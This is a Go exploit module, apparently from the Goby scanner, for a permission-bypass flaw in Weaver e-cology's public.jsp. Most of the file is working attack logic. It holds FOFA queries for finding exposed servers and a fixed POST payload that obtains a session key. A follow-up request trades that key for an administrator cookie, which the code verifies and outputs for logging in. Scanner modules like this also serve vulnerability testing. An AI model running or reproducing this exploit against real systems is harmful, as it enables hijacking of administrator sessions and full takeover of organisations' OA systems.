package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Weaver e-cology public.jsp file permission bypass vulnerability",
    "Description": "<p>Weaver e-cology is a large distributed application based on J2EE architecture launched by Shanghai Panmicro Network Co.</p><p>There is an unauthorized access vulnerability in pan micro e-cology, where attackers can obtain administrator login cookies by accessing unauthorized interfaces and log in and control the entire system, ultimately resulting in the system being in an extremely insecure state. </p>",
    "Product": "Weaver-OA(E-COLOGY)",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2022-07-28",
    "Author": "bablish",
    "FofaQuery": "title=\"泛微协同商务系统（e-cology）\" || body=\"/js/ecology8\" || body=\"ecologyContentPath\" || banner=\"ecology_JSessionId\" || header=\"ecology_JSessionId\" || body=\"/system/index_wev8.js\" || body=\"/wui/index.html\"",
    "GobyQuery": "title=\"泛微协同商务系统（e-cology）\" || body=\"/js/ecology8\" || body=\"ecologyContentPath\" || banner=\"ecology_JSessionId\" || header=\"ecology_JSessionId\" || body=\"/system/index_wev8.js\" || body=\"/wui/index.html\"",
    "Level": "3",
    "Impact": "<p>There is an unauthorized access vulnerability in pan micro e-cology, where attackers can obtain system manager login cookies by accessing unauthorized interfaces and log in and control the entire system, ultimately resulting in the system being in an extremely insecure state. </p>",
    "Recommendation": "<p>1、the official has not yet fixed the vulnerability, please contact the vendor to fix the vulnerability: <a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a></p><p>2、Deploy Web application firewall to monitor database operations.</p><p>3、If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "login",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/wui/index.html?#/?_key=abcdef",
                "follow_redirect": true,
                "header": {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "!=",
                        "value": "404",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/mobilemode/public.jsp",
                "follow_redirect": true,
                "header": {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Upgrade-Insecure-Requests": "1"
                },
                "data_type": "text",
                "data": "from=QRCode&url=CC4DFA20F3CF7CF61F86C43FA6A84C7020E42052CDB6847AEF9362D0FA570CB7"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "_sessionkey",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "_appid",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "_appHomepageId",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "session|lastbody|regex|var _sessionkey = \"(.*?)\";"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/weaver/weaver.file.ImgFileDownload/.css.map?sessionkey={{{session}}}",
                "follow_redirect": true,
                "header": {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Upgrade-Insecure-Requests": "1"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/wui/index.html?#/?_key=abcdef",
                "follow_redirect": true,
                "header": {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "!=",
                        "value": "404",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "key|lastheader|regex|Set-Cookie: (.*?); "
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/mobilemode/public.jsp",
                "follow_redirect": true,
                "header": {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Upgrade-Insecure-Requests": "1"
                },
                "data_type": "text",
                "data": "from=QRCode&url=CC4DFA20F3CF7CF61F86C43FA6A84C7020E42052CDB6847AEF9362D0FA570CB7"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "_sessionkey",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "_appid",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "_appHomepageId",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "session|lastbody|regex|var _sessionkey = \"(.*?)\";"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/weaver/weaver.file.ImgFileDownload/.css.map?sessionkey={{{session}}}",
                "follow_redirect": true,
                "header": {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Upgrade-Insecure-Requests": "1"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|define|variable|{{{fixedhostinfo}}} \\n Cookie: {{{key}}}"
            ]
        }
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "8.5",
    "Translation": {
        "CN": {
            "Name": "泛微 e-cology public.jsp 文件权限绕过漏洞",
            "Product": "泛微-OA（e-cology）",
            "Description": "<p>泛微 e-cology 是上海泛微网络有限公司推出的一个基于 J2EE 架构的大型分布式应用。用户可以阅读和处理 OA 的工作流程、新闻、联系人等各类信息。 <br></p><p>泛微 e-cology 存在未授权访问漏洞，攻击者可通过访问未授权接口获取管理员登陆 Cookie，并登陆、控制整个系统，最终导致系统处于极度不安全状态。</p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>泛微 e-cology 存在未授权访问漏洞，攻击者可通过访问未授权接口获取管理员登陆 Cookie，并登陆、控制整个系统，最终导致系统处于极度不安全状态。</p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "Weaver e-cology public.jsp file permission bypass vulnerability",
            "Product": "Weaver-OA(E-COLOGY)",
            "Description": "<p>Weaver e-cology is a large distributed application based on J2EE architecture launched by Shanghai Panmicro Network Co.</p><p>There is an unauthorized access vulnerability in pan micro e-cology, where attackers can obtain administrator login cookies by accessing unauthorized interfaces and log in and control the entire system, ultimately resulting in the system being in an extremely insecure state. </p>",
            "Recommendation": "<p>1、the official has not yet fixed the vulnerability, please contact the vendor to fix the vulnerability: <a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a></p><p>2、Deploy Web application firewall to monitor database operations.</p><p>3、If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>There is an unauthorized access vulnerability in pan micro e-cology, where attackers can obtain system manager login cookies by accessing unauthorized interfaces and log in and control the entire system, ultimately resulting in the system being in an extremely insecure state. </p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-09-14",
    "PocId": "10698"
}`
	getSessionKeyDNQWIOHUEXCZO := func(hostInfo *httpclient.FixUrl) string {
		postRequestConfig := httpclient.NewPostRequestConfig("/mobilemode/public.jsp")
		postRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		postRequestConfig.Data = "from=QRCode&url=CC4DFA20F3CF7CF61F86C43FA6A84C7020E42052CDB6847AEF9362D0FA570CB7"
		resp, err := httpclient.DoHttpRequest(hostInfo, postRequestConfig)
		if err != nil {
			return ""
		}
		reg, _ := regexp.Compile(`_sessionkey = "(.*?)";`)
		results := reg.FindAllStringSubmatch(resp.Utf8Html, -1)
		if len(results) > 0 && len(results[0]) > 1 {
			return results[0][1]
		}
		return ""
	}

	getCookieDJWOQIUYE := func(hostInfo *httpclient.FixUrl, sessionKey string) string {
		cookiesGetRequestConfig := httpclient.NewGetRequestConfig("/weaver/weaver.file.ImgFileDownload/.css.map?sessionkey=" + sessionKey)
		response, err := httpclient.DoHttpRequest(hostInfo, cookiesGetRequestConfig)
		if err != nil {
			return ""
		} else if response.StatusCode != 200 && len(response.Cookie) < 1 {
			return ""
		}
		verifyCookiesGetRequestConfig := httpclient.NewGetRequestConfig("/api/portal/systemInfo/getVersion")
		cookie := response.Cookie
		verifyCookiesGetRequestConfig.Header.Store("Cookie", cookie)
		if response, err = httpclient.DoHttpRequest(hostInfo, verifyCookiesGetRequestConfig); response != nil &&
			strings.Contains(response.Utf8Html, `"msg`) &&
			strings.Contains(response.Utf8Html, `{"data":{"`) &&
			strings.Contains(response.Utf8Html, `"website"`) &&
			strings.Contains(response.Utf8Html, `"companyname"`) {
			return cookie
		}
		return ""
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			sessionKey := getSessionKeyDNQWIOHUEXCZO(hostInfo)
			if len(sessionKey) < 1 {
				return false
			}
			return len(getCookieDJWOQIUYE(hostInfo, sessionKey)) > 0
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			sessionKey := getSessionKeyDNQWIOHUEXCZO(expResult.HostInfo)
			if len(sessionKey) < 1 {
				expResult.Success = false
				expResult.Output = "漏洞利用失败"
				return expResult
			}
			cookie := getCookieDJWOQIUYE(expResult.HostInfo, sessionKey)
			if len(cookie) == 0 || cookie == "" {
				expResult.Success = false
				expResult.Output = "漏洞利用失败"
				return expResult
			}
			if attackType == "login" {
				expResult.Success = true
				expResult.Output = "Cookie: " + cookie
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
